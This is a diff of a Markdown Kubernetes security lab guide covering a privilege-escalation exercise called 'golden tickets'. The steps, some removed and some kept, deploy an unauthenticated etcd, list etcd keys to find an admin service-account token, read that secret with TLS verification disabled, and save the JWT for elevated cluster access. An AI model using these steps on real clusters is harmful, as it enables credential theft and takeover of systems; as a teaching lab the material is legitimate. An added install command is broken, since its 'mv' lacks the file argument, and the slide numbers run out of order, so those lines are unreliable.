@@ -779,26 +779,8 @@ ansible k8s-ansible-setup.yml
 kubectl get namespace
 ```
 
-### Slide 123 - CA keys - golden tickets (lab setup)
 
-```
-cd ~ && git clone https://github.com/digital-shokunin/kube_security_lab.git
-```
-
-```
-cd kube_security_lab/
-```
-
-```
-cat etcd-noauth.yml
-```
-
-```
-ansible-playbook etcd-noauth.yml
-```
-This part may take a couple minutes
-
-### Slide 126 - CA keys - golden tickets (lab)
+### Slide 126 - Priv esc - to golden tickets (lab)
 
 We need the IP for the cluster, going to get it from Docker container for the control plane and assign it to a shell env variable
 ```
@@ -820,18 +802,25 @@ get / --prefix --keys-only |grep admins-account-token
 ```
 Make note of the random string at the end of the token name, you'll need it later
 
-### Slide 127 - CA keys - golden tickets (lab continued)
+### Slide 124 - Priv esc - to golden tickets (lab continued)
 
-Replace `[RAND]` at the end of the command below with the random string at the end of the token from the last command
+Install some utilities
 ```
-etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 get /registry/secrets/default/admins-account-token-[RAND]
+apt update && apt install -y curl
+```
+Download and install kubectl into the container
+```
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
 ```
 
-Copy the content of the token starting with the eyJ and up to just before the #kubernetes.io, this is the JWT token you'll need to get elevated access to the Kubernetes cluster
-
-Open up vi editing the new file we're creating `token.txt`
 ```
-vi token.txt
+chmod +x kubectl && mv /usr/local/bin/
+```
+
+
+
+```
+vim token.txt
 ```
 
 Paste the contents of the token you copied above by hitting `i`, then pasting.
